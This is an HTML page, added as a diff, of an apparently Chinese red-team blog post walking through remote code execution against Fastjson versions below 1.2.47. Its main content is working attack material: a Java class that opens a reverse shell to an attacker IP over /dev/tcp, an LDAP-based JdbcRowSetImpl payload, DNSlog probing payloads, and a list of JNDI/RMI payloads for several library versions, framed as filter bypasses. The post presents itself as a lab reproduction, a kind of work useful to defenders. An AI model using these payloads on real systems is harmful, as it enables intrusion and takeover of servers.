@@ -1,0 +1,525 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+ <meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
+<meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
+<meta HTTP-EQUIV="expires" CONTENT="0"> 
+<title>Fastjson &lt; 1.2.47 RCE 利用 | loecho</title>	
+
+<link rel="stylesheet" href="https://loecho.me/styles/main.css">
+<script type="text/javascript">
+function getCSS()
+{
+        datetoday = new Date();
+        timenow=datetoday.getTime();
+        datetoday.setTime(timenow);
+        thehour = datetoday.getHours();
+
+        if (thehour<0)
+
+            display = "https://loecho.me/media/css/night.css";
+
+       else if (thehour>24)
+
+            display = "https://loecho.me/media/css/night.css";   
+
+        else if (thehour>0)
+           
+            display = "https://loecho.me/media/css/day.css";
+
+        else if (thehour<24)
+
+            display = "https://loecho.me/media/css/day.css";
+      
+
+var css = '<';
+        css+='link rel="stylesheet" href='+display+' \/';
+        css+='>';
+        document.write(css);
+}
+</script>
+<link href="https://fonts.googleapis.com/css?family=Dancing+Script|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
+<link href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css" rel="stylesheet" />
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<script type='text/javascript' src='https://loecho.me/media/scripts/script.js'></script>
+<link href="https://cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet" />
+  <script src="https://cdn.bootcss.com/wow/1.1.2/wow.min.js"></script>
+  <script src="https://cdn.bootcss.com/highlight.js/9.15.8/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  <script>wow=new WOW({boxClass:'wow',animateClass:'animated',offset:0,mobile:true,live:true});wow.init();</script>
+
+<script type="text/javascript">
+window.onload=getCSS();
+</script>
+
+
+ 	
+</head>
+<body class="post-template-default single single-post postid-70 single-format-standard">
+    <div id="wrapper">
+        
+			
+		<header id="header" class="site-header" 
+		
+		>
+			<div class="site-branding">
+									<h1 class="site-title"><a href="https://loecho.me" rel="home">loecho</a></h1>
+										
+					<h2 class="site-description"><h4>Red Team@loecho /CTFer@Web /SRC</h4></h2>
+										
+							</div>
+			<nav id="nav-wrapper">
+				<div class="container">
+					<div class="nav-toggle">
+						<div class="bars">
+							<div class="bar"></div>
+							<div class="bar"></div>
+							<div class="bar"></div>
+						</div>
+					</div>
+					<div class="clear"></div>
+					<ul id="" class="dove">
+		 
+
+</ul>
+</li>		
+		
+</ul>				</div>
+			</nav>
+						<div class="jingge">
+
+
+    
+
+    
+			
+<a  href="https://github.com/a1ices" target="_blank" ><i class="iconfont icon-github"></i></a>
+ 
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+			
+<a  href="1414596457" target="_blank" ><i class="iconfont icon-qq"></i></a>
+ 
+    
+
+    
+
+    
+        </header>
+
+		<div id="content" class="container">
+			<div class="row">
+	<div class="col-md-8 site-main">
+				
+<article id="post-70" class="post-70 post type-post status-publish format-standard hentry category-5 tag-10 tag-9 tag-11">
+
+	
+	                      
+		<div class="entry-content">
+			<h1 class="wow swing entry-title">Fastjson &lt; 1.2.47 RCE 利用</h1>
+<div class="entry-meta">
+<div class="wow bounce">
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-06-11 15:21:57" itemprop="datePublished" pubdate="">2020-06-11</time></i>
+	          </div>
+			
+</span>
+													 
+		</div>
+                  
+			<div class="wow slideInLeft entry-summary song">
+				<h2 id="一-漏洞利用">一、漏洞利用</h2>
+<h2 id="0x00-rmi和ldap的适用版本">0x00 RMI和LDAP的适用版本</h2>
+<ul>
+<li>
+<p><strong>漏洞检测</strong>: https://github.com/uknowsec/BurpSuite-Extender-fastjson</p>
+</li>
+<li>
+<p><strong>利用工具:</strong> https://codeload.github.com/CaijiOrz/fastjson-1.2.47-RCE/zip/master</p>
+</li>
+<li>
+<p><strong>RMI的利用方式：</strong> 适用jdk版本：JDK 6u132, JDK 7u122, JDK 8u113之前。</p>
+</li>
+<li>
+<p><strong>LDAP的利用方式：</strong> 适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。</p>
+</li>
+</ul>
+<h2 id="二-漏洞影响">二、漏洞影响</h2>
+<ul>
+<li>Fastjson &lt; 1.2.47</li>
+</ul>
+<h2 id="三-复现过程">三、复现过程</h2>
+<ul>
+<li>1.<strong>启动Fastjson漏洞环境(版本为1.2.24)</strong></li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/BlogImg20200417171215.png" alt="" loading="lazy"></figure>
+<p><strong>访问一下,成功启动:</strong></p>
+<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/BlogImg20200417171332.png" alt="" loading="lazy"></figure>
+<p>在实际环境中我们不知道,后端json为Fastjson,通过一些方法来探测一下(细节可以看dalao博客)</p>
+<h4 id="01-手工探测">01. 手工探测:</h4>
+<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/BlogImg20200417175831.png" alt="" loading="lazy"></figure>
+<ul>
+<li><strong>探测结果:</strong></li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/BlogImg20200417180039.png" alt="" loading="lazy"></figure>
+<h4 id="02-burpsuit-插件-被动探测">02. BurpSuit 插件 被动探测:</h4>
+<p>1.配置插件,修改dnslog探测地址,还有token默认使用为Ceye.io来探测,流量只要经过BurpSuit,他就会自动探测,结果在插件的output中查看</p>
+<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200611145918284.png" alt="image-20200611145918284" loading="lazy"></figure>
+<h3 id="02-漏洞利用反弹shell">02 漏洞利用(反弹Shell)</h3>
+<ol>
+<li>下载利用工具,先配置恶意的Java代码,编译为Class文件</li>
+</ol>
+<pre><code class="language-java">import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+
+public class Loecho {
+    public Loecho() throws Exception {
+        Process p = Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/IP/8888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;});
+        InputStream is = p.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+
+        String line;
+        while((line = reader.readLine()) != null) {
+            System.out.println(line);
+        }
+
+        p.waitFor();
+        is.close();
+        reader.close();
+        p.destroy();
+    }
+
+    public static void main(String[] args) throws Exception {
+    }
+}
+</code></pre>
+<ol start="2">
+<li>
+<p>编译为Class文件,启动LDAP服务以及HTTP服务:</p>
+<figure data-type="image" tabindex="6"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200611151028539.png" alt="image-20200611151028539" loading="lazy"></figure>
+</li>
+<li>
+<p>BurpSuit 发送Payload,内容如下:</p>
+<pre><code class="language-json">
+{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:PORT/类名&quot;,&quot;autoCommit&quot;:true}}}
+
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200611151357328.png" alt="image-20200611151357328" loading="lazy"></figure>
+</li>
+</ol>
+<p>4.查看监听位置的请求,接受到Shell:</p>
+<figure data-type="image" tabindex="8"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200611151659799.png" alt="image-20200611151659799" loading="lazy"></figure>
+<ol start="5">
+<li>提供一些绕墙的Payload,网上总结:</li>
+</ol>
+<p><strong>手工探测Payload</strong></p>
+<pre><code> ```json
+
+ {&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://dnslog&quot;}}&quot;&quot;}
+ 
+ Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}]
+ 
+ Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}
+     
+ {{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}:0
+ 
+ 
+ {&quot;@type&quot;:&quot;java.net.Inet4Address&quot;, &quot;val&quot;:&quot;dnslog&quot;}
+ 
+ {&quot;@type&quot;:&quot;java.net.Inet6Address&quot;, &quot;val&quot;:&quot;dnslog&quot;}
+ 
+ {&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:, &quot;val&quot;:&quot;dnslog&quot;}}
+ 
+ {&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, 
+  &quot;val&quot;:&quot;dnslog&quot;}}&quot;&quot;}
+ 
+ {{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}:&quot;aaa&quot;}
+ 
+ Set[{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}]
+ 
+ Set[{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}
+     
+ {{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}:0
+ ```
+</code></pre>
+<p><strong>RCE-Payload</strong></p>
+<pre><code class="language-json">
+{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;&quot;autoCommit&quot;:true}
+ 
+{&quot;@type&quot;:&quot;LLcom.sun.rowset.RowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true} 1.2.42
+
+{&quot;@type&quot;:&quot;[com.sun.rowset.RowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true} 1.2.25v1.2.43
+
+{&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;：&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;}} 1.2.25
+
+{&quot;@type&quot;:&quot;Lcom.sun.rowset.RowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}
+
+{\&quot;@type\&quot;:\&quot;com.zaxxer.hikari.HikariConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.60
+ 
+{\&quot;@type\&quot;:\&quot;org.apache.commons.configuration.JNDIConfiguration\&quot;,\&quot;prefix\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.60
+ 
+{\&quot;@type\&quot;:\&quot;org.apache.commons.configuration2.JNDIConfiguration\&quot;,\&quot;prefix\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.61
+ 
+{\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;asText\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;}  1.2.62
+ 
+{\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;} AnterosDBCPConfig
+ 
+{\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;} AnterosDBCPConfig
+ 
+{\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;:{\&quot;UserTransaction\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;}} JtaTransactionConfig
+
+
+</code></pre>
+
+							</div>
+	<div class="wow bounceInDown vt-post-tags">
+ 
+					</div>						
+<nav class="navigation3 post-navigation3" role="navigation">
+		
+		<div class="nav-links3">
+      
+		 
+		<div class="wow bounceInRight nav-next3"><a href="https://loecho.me/w8iFoAIB3/" rel="next"> 2020-网鼎杯(青龙组) Web题目 WriteUp</a></div>
+		
+		</div>
+	</nav>
+	<div class="wow rollIn author-info" style="visibility: visible; animation-name: rollIn;">
+	<div class="author-avatar pull-left"><img src="https://loecho.me/images/avatar.png" ></div>
+ 
+	<div class="author-description"><div class="author-title"><div class="author-link" rel="author">Loecho</div></div>
+
+
+	<p class="author-bio">Red Team@loecho /CTFer@Web /SRC</p></div></div>
+	
+		</div>
+		
+ 
+		
+</article>
+
+<div id="marlin_lite_about_widget-2" class="wow bounceInUp widget marlin_lite_about_widget" data-wow-delay="0.1s">
+		
+        
+		<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://loecho.me/media/scripts/Valine.min.js'></script>
+
+<div class="comment"></div>
+<script>
+        new Valine({
+            // AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+            av: AV, 
+            el: '.comment',
+            lang: 'zh-cn',
+            
+            admin_email:'1414596457@qq.com',
+            
+            
+      emoticon_list: ["吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"],
+     	
+      	
+          
+      placeholder: '欢迎质疑'
+       
+        });
+    </script> 
+
+
+   
+  
+ 
+
+		</div>
+
+			</div>
+			
+
+
+<div class="tocc col l3 hide-on-med-and-down">
+	
+        <div class="toc-widget">
+			
+            <div class="toc-title"></div>
+			
+            <div id="toc-content">
+			
+			
+			</div>
+        </div>
+    </div>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.5.0/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '.entry-summary',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('.entry-summary').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>										 
+
+ 
+       
+
+
+			</div>
+		</div>
+
+		
+		 	<footer id="colophon" class="site-footer">
+
+			<div class="container">
+	
+				<div class="copyright"><a>Red Team@loecho /CTFer@Web /SRC </a><br>Theme:   <a href="https://github.com/shanbufun/gridea-theme-pan" target="_blank" title="Pan"><span>Pan</span></a>.  by <a href="https://shanbu.fun/" target="_blank"  title="山卜方" >Shanbufun</a></div>		
+			</div>
+		
+		</footer>
+
+</div>
+
+<script src="https://cdn.bootcss.com/fitvids/1.2.0/jquery.fitvids.min.js"></script>
+<script type='text/javascript' src='https://loecho.me/media/scripts/marlin-scripts.js'></script>
+ <script src="//tokinx.github.io/lately/lately.min.js"></script>
+  <script>jQuery(document).ready(function(){$.lately({'target':'.lately-a,.lately-b,.lately-c'})});</script>
+  <style type="text/css">a.back_to_top {
+    text-decoration: none;
+    position: fixed;
+    bottom: 40px;
+    right: 30px;
+    background: #f0f0f0;
+    height: 40px;
+    width: 40px;
+    border-radius: 50%;
+    line-height: 36px;
+    font-size: 18px;
+    text-align: center;
+    transition-duration: .5s;
+    transition-propety: background-color;
+    display: none;
+}
+
+a.back_to_top span {
+    color: #888;
+}
+
+a.back_to_top:hover {
+    cursor: pointer;
+    background: #dfdfdf;
+}
+
+a.back_to_top:hover span {
+    color: #555;
+}
+
+@media print, screen and (max-width: 580px) {
+    .back_to_top {
+        display: none !important;
+    }
+}
+
+
+
+</style><a id="back_to_top" href="#" class="back_to_top"><span><i class="iconfont icon-xiangshang"></i></span>
+</a>
+
+
+<script>$(document).ready((function(_this) {
+  return function() {
+    var bt;
+    bt = $('#back_to_top');
+    if ($(document).width() > 480) {
+      $(window).scroll(function() {
+        var st;
+        st = $(window).scrollTop();
+        if (st > 30) {
+          return bt.css('display', 'block');
+        } else {
+          return bt.css('display', 'none');
+        }
+      });
+      return bt.click(function() {
+        $('body,html').animate({
+          scrollTop: 0
+        }, 800);
+        return false;
+      });
+    }
+  };
+})(this));
+</script>
+
+		<script data-no-instant>
+    (function ($) {
+        $.extend({
+            adamsOverload: function () {
+                $('.navigation:eq(0)').remove();
+                $("").attr("rel" , "external");
+                $("a[rel='external'],a[rel='external nofollow']").attr("target","_blank");
+                $("a.vi").attr("rel" , "");
+                $.viewImage({
+                    'target'  : 'img',
+                    'exclude' : '.vsmile-icons img,.gallery img',
+                    'delay'   : 300
+                });
+                $.lately({
+                    'target' : '.commentmetadata a,.infos time,.post-list time'
+                });
+                prettyPrint();
+                
+                $('ul.links li a').each(function(){
+                    if($(this).parent().find('.bg').length==0){
+                        $(this).parent().append('<!---<div class="bg" style="background-image:url(https://c3.glgoo.top/s2/favicons?domain='+$(this).attr("href")+')"></div>--->')
+                    }
+                });
+            }
+        });
+    })(jQuery);
+    jQuery.adamsOverload();
+</script>
+
+</body>
+</html>
